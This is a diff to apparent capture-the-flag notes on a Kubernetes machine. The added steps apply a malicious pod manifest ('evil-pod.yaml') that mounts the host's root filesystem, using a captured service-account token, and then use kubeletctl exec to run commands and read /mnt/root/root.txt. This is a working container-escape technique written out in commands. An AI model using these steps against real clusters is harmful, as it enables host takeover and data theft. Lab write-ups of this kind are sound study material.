@@ -47,7 +47,7 @@
    - namespace is default
    - image is nginx:1.14.2
 - grab yaml file from prevous machine and upadate it for this scenario
-- ```
+```
   apiVersion: v1 
 kind: Pod
 metadata:
@@ -67,4 +67,10 @@ spec:
   automountServiceAccountToken: true
   hostNetwork: true
 ```
-
+- The name is arbitrary. The namespace is the one I’ve been working out of, default. I’ll use the image that already exists here, nginx:1.14.2. The rest is just setting up the volumes / volumeMounts. The volumeMount says that I’m going to mount a volume named hostfs into the container at the mount point /mnt. Then that volume is defined as / on the host file system
+- kubectl apply is used to start the pod :
+- **kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token**
+- Execution via Kubelet works just like it did in the original nginx container
+- **kubeletctl exec "id" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod**
+- But this time the host file system is mounted at /mnt and i can read root.txt
+- **kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod**
